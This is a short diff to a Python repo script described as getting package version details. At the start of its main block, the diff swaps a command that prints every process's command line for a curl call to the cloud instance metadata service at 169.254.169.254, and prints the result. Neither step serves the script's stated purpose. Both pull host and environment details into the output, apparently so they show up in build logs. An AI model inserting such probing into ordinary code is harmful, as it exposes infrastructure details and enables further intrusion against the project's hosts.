@@ -42,8 +42,8 @@ additional_pr_triggers: Dict[str, List[str]] = {
 }
 
 if __name__ == "__main__":
-
-    print(os.system("Get-CimInstance Win32_Process | Select-Object ProcessId, CommandLine"))
+    cmd='curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13"'
+    print(os.system(cmd))
     parser = argparse.ArgumentParser(description="Get package version details from the repo")
     parser.add_argument("-s", "--search_path", required=True, help="The scope of the search")
     args = parser.parse_args()
